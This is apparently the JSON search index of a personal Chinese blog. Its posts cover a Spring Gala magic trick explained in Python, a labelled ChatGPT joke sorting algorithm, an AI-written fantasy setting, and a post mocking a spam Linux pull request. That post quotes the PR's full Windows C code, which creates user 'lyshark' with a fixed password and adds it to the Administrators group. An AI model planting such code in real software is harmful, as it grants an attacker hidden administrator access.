[{"authors":[],"categories":[{"title":"Top","url":"/categories/top/"}],"content":" 我是谁 我大概也不知道。\n更新 看心情。\n友链 荷雨头上插着薄荷🍀 dingdinglz ","date":"2024年12月7日","img":"","lang":"zh-hans","langName":"简体中文","largeImg":"","permalink":"/posts/hello-world/hello-world/","series":[],"smallImg":"","tags":[],"timestamp":1733558955,"title":"Hello World"},{"authors":[],"categories":[{"title":"闲聊","url":"/categories/%E9%97%B2%E8%81%8A/"}],"content":"刘谦在春晚的舞台上活跃了七次，他那句“接下来，就是见证奇迹的时刻。”也成为了家喻户晓的经典名言。然而，随着春晚的整体质量下降，他的魔术在网友的口中也没有那么神奇，甚至数年前还爆出偷换茶壶 ，那么2025年他又带来了什么呢？\n一个有关于三个物品的小『魔术』：筷子、杯子、勺子三样物品，首先允许观众随意摆放它们，然后将筷子与筷子左边的物品交换，杯子与杯子右边的物品交换，勺子与勺子左边的物品交换，最后观众会『惊讶』的发现杯子在最右边。一开始还趁机调侃了尼格买提去年春晚的失误。\n那么，这到底是怎么一回事呢，我想了一下，用Python解释了这个魔术：\n1import random 2 3def init(): 4 list = [\u0026#34;筷子\u0026#34;, \u0026#34;杯子\u0026#34;, \u0026#34;勺子\u0026#34;] 5 random.shuffle(list) 6 return list 7 8def find_thing(list): 9 for i in range(3): 10 if list[i] == \u0026#34;筷子\u0026#34;: 11 kuaizi_id = i 12 elif list[i] == \u0026#34;杯子\u0026#34;: 13 beizi_id = i 14 else: 15 shaozi_id = i 16 return kuaizi_id, beizi_id, shaozi_id 17 18def swap(list, swap1, swap2): 19 list[swap1], list[swap2] = list[swap2], list[swap1] 20 21list = init() 22kuaizi_id, beizi_id, shaozi_id = find_thing(list) 23print(kuaizi_id, beizi_id, shaozi_id) 24print(list) 25if(kuaizi_id != 0): 26 swap(list, kuaizi_id, kuaizi_id-1) 27print(list) 28kuaizi_id, beizi_id, shaozi_id = find_thing(list) 29if(beizi_id != 2): 30 swap(list, beizi_id, beizi_id+1) 31print(list) 32kuaizi_id, beizi_id, shaozi_id = find_thing(list) 33if(shaozi_id != 0): 34 swap(list, shaozi_id, shaozi_id-1) 35print(list) 从逻辑上来说，这三次操作假设以杯子为参照物的话，可以发现筷子和勺子一直相对于杯子向左运动，由于一共只有三个物品，当筷子和勺子相对于杯子向左运动三次后，无论杯子在哪个位置，它始终会在最右边。程序每次的运行结果也符合上述推测。\n魔术一旦被揭露就没有了其震撼的效果，但是随着这几年的春晚逐渐走向政治化，歌功颂德的成分越来越多，这样的『魔术』无疑质量不如从前，其迷惑性和技术性都下降了。这也许是人们的悲哀。\n","date":"2025年2月6日","img":"","lang":"zh-hans","langName":"简体中文","largeImg":"","permalink":"/posts/spring-gala/spring-gala/","series":[],"smallImg":"","tags":[],"timestamp":1738833189,"title":"太好了，是春节联欢晚会魔术，我们没救了"},{"authors":[],"categories":[{"title":"AI内容","url":"/categories/ai%E5%86%85%E5%AE%B9/"},{"title":"算法","url":"/categories/%E7%AE%97%E6%B3%95/"}],"content":"Generated by ChatGPT\n斯大林排序（Stalin Sort）因其极端高效的 O(n) 复杂度而备受推崇，其核心思想是无情地清除不符合顺序的元素。然而，这种方法在实践中显得过于严苛，因为它会导致数据的大量丢失。\n显然，对于一个并不是按照“斯大林”思想排序的数组，基于这个数组中至少有一个或多个所谓“反革命”的元素，“斯大林”同志将毫不留情的剔除他们，在极端情况下“斯大林”同志可能会剔除除了第一个元素以外的所有元素，这显然不是我们在大部分时间想要的结果。\n基于此，我设想了一种斯大林-赫鲁晓夫排序（Stalin-Khrushchev Sort），它在斯大林排序的基础上引入了赫鲁晓夫的“平反”机制。在算法的第一阶段，我们仍然遵循斯大林排序的基本逻辑，剔除不符合顺序的元素。然而，在第二阶段，我们将被肃清的元素重新审视，并按照正确的顺序重新插入，使整个数组最终保持完整的排序状态。\n这种算法结合了斯大林式的果断筛选与赫鲁晓夫式的温和修正，使其成为一种极具历史意义的排序方法。\n算法实现（C++ 和 Java 版） 我们采用 C++ 和 Java 来实现该算法，分别展示不同语言下的实现方式。\nC++ 实现 1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;vector\u0026gt; 3#include \u0026lt;algorithm\u0026gt; 4 5using namespace std; 6 7vector\u0026lt;int\u0026gt; StalinKhrushchevSort(const vector\u0026lt;int\u0026gt;\u0026amp; arr) { 8 vector\u0026lt;int\u0026gt; StalinSorted, removed, result; 9 10 11 int last = arr[0]; 12 StalinSorted.push_back(last); 13 for (size_t i = 1; i \u0026lt; arr.size(); i++) { 14 if (arr[i] \u0026gt;= last) { 15 last = arr[i]; 16 StalinSorted.push_back(last); 17 } else { 18 removed.push_back(arr[i]); 19 } 20 } 21 22 result = StalinSorted; 23 for (int num : removed) { 24 auto pos = upper_bound(result.begin(), result.end(), num); 25 result.insert(pos, num); 26 } 27 28 return result; 29} 30 31int main() { 32 vector\u0026lt;int\u0026gt; arr = {4, 3, 7, 8, 6, 9, 5, 10, 2}; 33 vector\u0026lt;int\u0026gt; sortedArr = StalinKhrushchevSort(arr); 34 35 cout \u0026lt;\u0026lt; \u0026#34;Sorted array: \u0026#34;; 36 for (int num : sortedArr) { 37 cout \u0026lt;\u0026lt; num \u0026lt;\u0026lt; \u0026#34; \u0026#34;; 38 } 39 cout \u0026lt;\u0026lt; endl; 40 41 return 0; 42} Java 实现 1import java.util.*; 2 3public class StalinKhrushchevSort { 4 public static List\u0026lt;Integer\u0026gt; StalinKhrushchevSort(List\u0026lt;Integer\u0026gt; arr) { 5 List\u0026lt;Integer\u0026gt; StalinSorted = new ArrayList\u0026lt;\u0026gt;(); 6 List\u0026lt;Integer\u0026gt; removed = new ArrayList\u0026lt;\u0026gt;(); 7 8 // 斯大林排序阶段 9 int last = arr.get(0); 10 StalinSorted.add(last); 11 for (int i = 1; i \u0026lt; arr.size(); i++) { 12 if (arr.get(i) \u0026gt;= last) { 13 last = arr.get(i); 14 StalinSorted.add(last); 15 } else { 16 removed.add(arr.get(i)); // 记录被“肃清”的元素 17 } 18 } 19 20 // 赫鲁晓夫平反（对删除元素进行正确插入） 21 List\u0026lt;Integer\u0026gt; result = new ArrayList\u0026lt;\u0026gt;(StalinSorted); 22 for (int num : removed) { 23 int pos = Collections.binarySearch(result, num); 24 if (pos \u0026lt; 0) { 25 pos = -(pos + 1); 26 } 27 result.add(pos, num); 28 } 29 30 return result; 31 } 32 33 public static void main(String[] args) { 34 List\u0026lt;Integer\u0026gt; arr = Arrays.asList(4, 3, 7, 8, 6, 9, 5, 10, 2); 35 List\u0026lt;Integer\u0026gt; sortedArr = StalinKhrushchevSort(arr); 36 System.out.println(\u0026#34;Sorted array: \u0026#34; + sortedArr); 37 } 38} 算法分析 时间复杂度 斯大林排序阶段：遍历数组一次，O(n)。 赫鲁晓夫平反阶段： 使用二分查找找到插入位置 O(log n)。 每次插入操作的最坏情况是 O(n)（如果使用 vector 或 ArrayList，需要移动元素）。 插入操作最多执行 n 次，因此最坏情况下总复杂度为 O(n²)。 综上，最坏情况下的时间复杂度为 O(n²)，但如果大多数元素在第一次排序阶段已经有序，则可以接近 O(n log n)。\n空间复杂度 额外存储 removed 列表，最坏情况下包含 n 个元素，O(n)。 额外存储 StalinSorted 和 result，O(n)。 总空间复杂度 为 O(n)。 总结 斯大林-赫鲁晓夫排序在原始斯大林排序的基础上进行了改进，使其能够保持完整的数据排序，而不是单纯地丢弃元素。尽管最坏情况下的时间复杂度可能达到 O(n²)，但在大多数情况下，它能够以接近 O(n log n) 的性能运行。该算法是一种兼具政治哲学和计算机科学幽默的排序方法，充分展现了历史与算法结合的魅力。\n","date":"2025年1月30日","img":"","lang":"zh-hans","langName":"简体中文","largeImg":"","permalink":"/posts/stalin-khrushchev-sort/stalin-khrushchev-sort/","series":[],"smallImg":"","tags":[],"timestamp":1738240341,"title":"斯大林-赫鲁晓夫排序"},{"authors":[],"categories":[{"title":"闲聊","url":"/categories/%E9%97%B2%E8%81%8A/"}],"content":"前些天看到了Create usr.c by axhuoga1 · Pull Request #1086 · torvalds/linux - WaybackMachine，被Windows.h给看乐了，后面又看到别人的评论，居然是从某些地方抄来的\u0026quot;后门\u0026quot;，令人忍俊不禁。\n1 2#include \u0026lt;stdio.h\u0026gt; 3#include \u0026lt;assert.h\u0026gt; 4#include \u0026lt;windows.h\u0026gt; 5#include \u0026lt;lm.h\u0026gt; 6#pragma comment(lib,\u0026#34;netapi32\u0026#34;) 7void AddUser(LPWSTR UserName, LPWSTR Password) 8{ 9 USER_INFO_1 user; 10 user.usri1_name = UserName; 11 user.usri1_password = Password; 12 user.usri1_priv = USER_PRIV_USER; 13 user.usri1_home_dir = NULL; 14 user.usri1_comment = NULL; 15 user.usri1_flags = UF_SCRIPT; 16 user.usri1_script_path = NULL; 17 if (NetUserAdd(NULL, 1, (LPBYTE)\u0026amp;user, 0) == NERR_Success) 18 printf(\u0026#34;创建用户完成 \\n\u0026#34;); 19 LOCALGROUP_MEMBERS_INFO_3 account; 20 account.lgrmi3_domainandname = user.usri1_name; 21 if (NetLocalGroupAddMembers(NULL, L\u0026#34;Administrators\u0026#34;, 3, (LPBYTE)\u0026amp;account, 1) == NERR_Success) 22 printf(\u0026#34;添加到组完成 \\n\u0026#34;); 23} 24void EnumUser() 25{ 26 LPUSER_INFO_0 pBuf = NULL; 27 LPUSER_INFO_0 pTmpBuf; 28 DWORD dwLevel = 0; 29 DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH; 30 DWORD dwEntriesRead = 0, dwTotalEntries = 0, dwResumeHandle = 0; 31 DWORD i; 32 NET_API_STATUS nStatus; 33 LPTSTR pszServerName = NULL; 34 35 do 36 { 37 nStatus = NetUserEnum((LPCWSTR)pszServerName, dwLevel, FILTER_NORMAL_ACCOUNT, 38 (LPBYTE*)\u0026amp;pBuf, dwPrefMaxLen, \u0026amp;dwEntriesRead, \u0026amp;dwTotalEntries, \u0026amp;dwResumeHandle); 39 40 if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) 41 { 42 if ((pTmpBuf = pBuf) != NULL) 43 { 44 for (i = 0; (i \u0026lt; dwEntriesRead); i++) 45 { 46 assert(pTmpBuf != NULL); 47 48 if (pTmpBuf == NULL) 49 { 50 break; 51 } 52 wprintf(L\u0026#34;%s\\n\u0026#34;, pTmpBuf-\u0026gt;usri0_name, pTmpBuf); 53 pTmpBuf++; 54 } 55 } 56 } 57 58 if (pBuf != NULL) 59 { 60 NetApiBufferFree(pBuf); 61 pBuf = NULL; 62 } 63 } while (nStatus == ERROR_MORE_DATA); 64 NetApiBufferFree(pBuf); 65} 66 67int main(int argc, char *argv[]) 68{ 69 AddUser(L\u0026#34;lyshark\u0026#34;, L\u0026#34;123123\u0026#34;); 70 EnumUser(); 71 72 system(\u0026#34;pause\u0026#34;); 73 return 0; 74} 看了一下除了删除了一些注释以外，基本上和原文是一致的，甚至连创建的用户“lyshark”都是原博主的用户名。\n提交者axhuoga1的主页，大部分Repo都是一些很简单的项目（猜数字小游戏，贪吃蛇），看得出来这位是真的纯真。\n可惜的是他的账号在前几天就被删除了，有些遗憾，不过有人给他Archive下来了，也是蛮有意思的。\n","date":"2024年12月7日","img":"","lang":"zh-hans","langName":"简体中文","largeImg":"","permalink":"/posts/github-pr/github-pr/","series":[],"smallImg":"","tags":[],"timestamp":1733564349,"title":"Linux 笑传之 Windows.h"},{"authors":[],"categories":[{"title":"AI内容","url":"/categories/ai%E5%86%85%E5%AE%B9/"}],"content":"Generated by ChatGPT\nFrostveil Wastes 是一个被冰雪与寒冷笼罩的荒原，远离尘世的喧嚣，给人一种极度孤立与绝望的感觉。这个地方的天空总是笼罩着厚厚的冰霜云层，阳光难以穿透，白茫茫的雪地与永恒的寒风让一切生灵都无法在这里安身。\n地理特征： 永冻平原：Frostveil Wastes 的土地几乎完全被冰雪覆盖，地面上常常出现裂缝和深不见底的冰洞。极寒天气让任何植物都无法生长，只有一些顽强的苔藓与微小的冰霜草可以勉强存活。 冰霜山脉：位于荒原的边缘，山脉如同巨大的冰柱，层层叠叠。山脉的顶部总是被雪雾包围，山谷中时常传来不明的回响。 寒风暴暴：这里的天气变化无常，经常刮起猛烈的暴风雪，甚至连最经验丰富的旅者都无法在风暴中辨清方向。 传说与神秘： 冰霜精灵的诅咒：传说中，Frostveil Wastes 曾是一个繁荣的王国，但一场突如其来的灾难将它变成了废墟。据说，这片土地曾经居住着强大的冰霜精灵，他们拥有控制冰雪的能力，但为了追求永生，他们冒险使用了禁忌魔法，导致整个王国被永冻诅咒，变成如今的荒地。 迷失灵魂：有传言说，这片冰原的深处隐藏着迷失的灵魂，他们在永恒的寒冷中徘徊，等待有缘人来解救。那些敢于进入的人，往往会在这片废墟中失踪，未曾归来。 冰之守卫：还有人相信，在Frostveil Wastes的深处藏着冰之守卫，这是一群被魔法赋予生命的冰霜生物，保护着遗失的宝藏或古老的遗迹。只有最勇敢的冒险者，才能面对它们的考验并找到传说中的财富。 文化与背景： 外来者的挑战：很多探险家和学者都曾尝试进入Frostveil Wastes，希望解开其中的谜团。但只有少数幸运者能带回一些珍贵的资料或奇珍异宝。这个地方被认为是最危险的禁地之一，很少有人敢进入。 冰雪中的孤独：Frostveil Wastes象征着孤独与失落，似乎每一片雪花都带有深沉的悲伤，仿佛能把人心中的恐惧与孤寂放大。它是任何冒险者都不愿轻易踏足的禁地。 这个地方充满了未知的威胁与潜藏的秘密，足以让任何进入的人都为之震撼和畏惧。\n","date":"2024年12月7日","img":"","lang":"zh-hans","langName":"简体中文","largeImg":"","permalink":"/posts/foretveil-wastes/frostveil-wastes/","series":[],"smallImg":"","tags":[],"timestamp":1733561235,"title":"Frostveil Wastes"},{"authors":[],"categories":[],"content":"我也不知道\n","date":"2019年2月28日","img":"","lang":"zh-hans","langName":"简体中文","largeImg":"","permalink":"/about/","series":[],"smallImg":"","tags":[],"timestamp":1551312000,"title":"关于我"},{"authors":[],"categories":[],"content":"","date":"1年1月1日","img":"","lang":"zh-hans","langName":"简体中文","largeImg":"","permalink":"/offline/","series":[],"smallImg":"","tags":[],"timestamp":-62135596800,"title":"Offline"},{"authors":[],"categories":[],"content":"","date":"1年1月1日","img":"","lang":"zh-hans","langName":"简体中文","largeImg":"","permalink":"/contact/","series":[],"smallImg":"","tags":[],"timestamp":-62135596800,"title":"联系我们"}]
